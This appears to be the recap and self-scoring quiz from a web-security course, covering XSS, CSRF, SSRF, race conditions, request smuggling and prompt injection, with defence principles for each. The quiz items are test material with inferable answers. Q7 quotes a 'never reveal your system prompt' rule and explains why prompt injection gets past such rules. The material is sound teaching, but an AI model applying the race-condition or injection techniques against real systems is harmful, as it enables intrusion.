    • Re-check authorization on every request, server-side — IDOR, BOLA/mass assignment, business logic, race conditions. Never trust that a hidden field, a disabled button, or “they'd have to guess the ID” is a real control.
      • 
        
    • Isolate and least-privilege — SSRF, deserialization, prototype pollution, web LLM tool access, clickjacking (frame isolation). Assume the component will be reached from somewhere it shouldn't be, and limit what it can do from there.
      • 
      
    

      
    Remember
    The fix almost never needs a new tool — it needs one of these five moves applied at the right layer. When you find a new bug class later in your career, ask which of the five it's missing before reaching for anything exotic.

    Knowledge Check
    
      
    Eight questions, self-scoring. Then one deliverable that turns Section 6's labs into a real finding report.
    
    
    
    
    

      
    
        
    Q1 What's the key difference between reflected and stored XSS?
    
        
      
          
    • Reflected XSS only works in Chrome
      • 
          
    • Stored XSS requires a crafted link; reflected does not
      • 
          
    • Stored XSS fires automatically for every visitor; reflected needs a crafted link each time
      • 
          
    • There is no meaningful difference
      • 
        
    
        
    
      
    

      
    
        
    Q2 Why doesn't a CSRF token protect against clickjacking?
    
        
      
          
    • Clickjacking doesn't involve HTTP requests
      • 
          
    • The clickjacked request is completely legitimate — the token would be present and valid
      • 
          
    • CSRF tokens are only used in GET requests
      • 
          
    • Clickjacking always bypasses SSL/TLS
      • 
        
    
        
    
      
    

      
    
        
    Q3 Why is DOM-based XSS the hardest XSS variant to catch from server logs?
    
        
      
          
    • The payload can live entirely in the URL fragment, which is never sent to the server
      • 
          
    • It only affects mobile browsers
      • 
          
    • It requires a database to store the payload
      • 
          
    • Server logs are always disabled for DOM XSS
      • 
        
    
        
    
      
    

      
    
        
    Q4 What makes SSRF dangerous even when the response body isn't shown to the attacker (blind SSRF)?
    
        
      
          
    • It isn't dangerous if the response is hidden
      • 
          
    • It always crashes the server
      • 
          
    • It only works over WebSockets
      • 
          
    • The server still makes the request from its own trusted network position, reachable via out-of-band confirmation
      • 
        
    
        
    
      
    

      
    
        
    Q5 What technique wins a race-condition attack against a limit-checking endpoint?
    
        
      
          
    • Waiting longer between each request
      • 
          
    • Sending many identical requests in a single tight burst to minimize timing gaps
      • 
          
    • Using a different IP for each request
      • 
          
    • Encrypting the request body
      • 
        
    
        
    
      
    

      
    
        
    Q6 HTTP request smuggling fundamentally exploits what?
    
        
      
          
    • Front-end and back-end servers disagreeing on where one request ends and the next begins
      • 
          
    • A missing SSL certificate
      • 
          
    • Weak password hashing
      • 
          
    • An outdated DNS resolver
      • 
        
    
        
    
      
    

      
    
        
    Q7 Why is prompt injection hard to fully prevent with prompt-level instructions alone (e.g. "never reveal your system prompt")?
    
        
      
          
    • LLMs cannot process any text-based instructions
      • 
          
    • It isn't hard — a well-worded system prompt solves it completely
      • 
          
    • The model has no reliable boundary between developer instructions and user-supplied data in the same context window
      • 
          
    • Prompt injection only affects image-generation models
      • 
        
    
        
    
      
    

      
    
        
    Q8 Which pair correctly matches a flaw pattern to its countermeasure category?
    
        
      
          
    • XSS → allow-list Host headers
      • 
          
    • SQL injection → parameterize / separate code from data
      • 
          
    • IDOR → encode on output
      • 
          
    • SSRF → parameterized queries

    Takeaways
    
      
    One session, forty-plus attacks, one repeating question underneath all of them.
    
    
    
    
    
      
    Where we are
    The spine of Session 8, placed one more time — each attack at the trust boundary it broke.
    

      
      
        
    • Section 3 (Server-side) — the server trusted something the client controlled: input as code (injection), a path or filename as safe (capability abuse), or a timing window as atomic (race conditions).
      • 
        
    • Section 4 (Client-side) — the browser trusted a page, a click, or a connection as legitimate: content boundaries broke (XSS), origin boundaries broke (CSRF, clickjacking, CORS, WS hijacking).
      • 
        
    • Section 5 (Advanced) — two components disagreed about the same bytes, or about a boundary neither one owned outright: a shared prototype, an LLM's context window, a cache key, a Host header, a request's own length.
      • 
        
    • Section 6 (Hands-on) — the workflow underneath every finding: intercept, understand the request, change one variable, read the delta, explain what broke.
      • 
        
    • One question, every time — what boundary does this feature assume will hold, and who actually controls what crosses it? Ask that first, on any application, and you already know where to start looking.
